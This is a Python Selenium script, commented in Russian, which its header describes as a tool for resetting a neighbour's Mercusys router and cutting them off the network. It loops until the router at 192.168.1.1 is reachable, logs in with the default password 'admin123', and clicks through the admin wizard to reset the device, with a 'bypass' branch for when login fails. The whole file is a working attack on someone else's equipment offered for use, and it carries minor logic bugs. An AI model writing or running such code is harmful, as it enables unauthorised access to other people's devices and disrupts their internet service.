import time
from tqdm import tqdm
import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from colorama import Fore, Style
#программа которая сбрасывает роутер соседа, отключает от сети заходя на сам роутер по адресу 192.168.1.1 Роутер мерксус
def work_cite():
    try:
        for i in tqdm(range(100), desc="Процесс", bar_format="{l_bar}{bar}{r_bar}", colour='red'):
            # Выполняем задачу
            time.sleep(1)  # Можно заменить на ваш код
        print(f"{Fore.BLUE}Запуск браузера!!!{Style.RESET_ALL}")
        driver = webdriver.Chrome()
        driver.maximize_window()
        driver.get("http://192.168.1.1")
        time.sleep(7)
    
        textarea = driver.find_element(By.CSS_SELECTOR, ".text-text.password-text.password-hidden") #ввод первого пароля
        textarea.send_keys("admin123")
        time.sleep(1)
        #проверка есть ли поле для второго пароля
        password_inputs = driver.find_elements(By.CSS_SELECTOR, 'input[type="password"].text-text.password-text.password-hidden')
       
        if len(password_inputs) >= 2:
            textarea1 = password_inputs[1]
        else:
            print(f"{Fore.RED}Ошибка авторизации, обходим!{Style.RESET_ALL}")
            time.sleep(1)
            button_element = driver.find_element(By.XPATH, '//a[@class="button-button" and @title="ВХОД"]')
            button_element.click()
            time.sleep(4)
            element = driver.find_element(By.CSS_SELECTOR, '.page-content-container.su-scroll.ps.ps--active-y')
            driver.execute_script("arguments[0].scrollTop = arguments[0].scrollHeight;", element)
            time.sleep(4)

            button_element1 = driver.find_element(By.XPATH, '//a[@class="button-button" and @title="ДАЛЕЕ"]')
            time.sleep(2)
            button_element1.click()
            time.sleep(2)
            element = driver.find_element(By.XPATH, '//a[@class="button-button" and @title="ДА"]')
            element.click()
            time.sleep(2)
            element1 = driver.find_elements(By.XPATH, '//a[@class="button-button" and @type="button" and @title="ДАЛЕЕ"]')
            if len(element1) >= 2:
                dalee = element1[1]
            else:
                print(f"{Fore.RED}Недостаточно совпадающих элементов{Style.RESET_ALL}")
            dalee.click()
            time.sleep(10)
            driver.quit()
            print(f"{Fore.BLUE}Успешно{Style.RESET_ALL}")

        textarea1.send_keys("admin123")
        time.sleep(1)

        checkbox_label = driver.find_element(By.CLASS_NAME, 'checkbox-label')
        checkbox_label.click()
        time.sleep(1)

        button_element = driver.find_element(By.XPATH, '//a[@class="button-button" and @title="Приступим к работе"]')
        
        button_element.click()
        time.sleep(5)


        time.sleep(3)
        element = driver.find_element(By.CSS_SELECTOR, '.page-content-container.su-scroll.ps.ps--active-y')
        driver.execute_script("arguments[0].scrollTop = arguments[0].scrollHeight;", element)

        time.sleep(1)

        button_element = driver.find_element(By.XPATH, '//a[@class="button-button" and @title="ДАЛЕЕ"]')
        button_element.click()
        time.sleep(1)

        element = driver.find_element(By.XPATH, '//a[@class="button-button" and @title="ДА"]')
        element.click()
        time.sleep(3)

        element1 = driver.find_elements(By.XPATH, '//a[@class="button-button" and @type="button" and @title="ДАЛЕЕ"]')
        if len(element1) >= 2:
            dalee = element1[1]
        else:
            print(f"{Fore.RED}Недостаточно совпадающих элементов{Style.RESET_ALL}")
        dalee.click()
        time.sleep(3)
        driver.quit()
        print(f"{Fore.BLUE}Успешно{Style.RESET_ALL}")
        time.sleep(20)
    except:
        driver.quit()
        print(f"{Fore.RED}Ошибка браузера{Style.RESET_ALL}")
while True:
    try:
        time.sleep(5)
        s = requests.get('http://ya.ru')
        s1 = requests.get('http://192.168.1.1')
 

        if s.status_code == 200 and s1.status_code == 200:
            print(f"{Fore.YELLOW}WIFI появился. Сеть появилась.{Style.RESET_ALL}")
            work_cite()
        else:      
            pass
            #print("Нет сети")
            continue
    except requests.exceptions.RequestException as e:
        pass
        #print("Ошибка или нет сети")
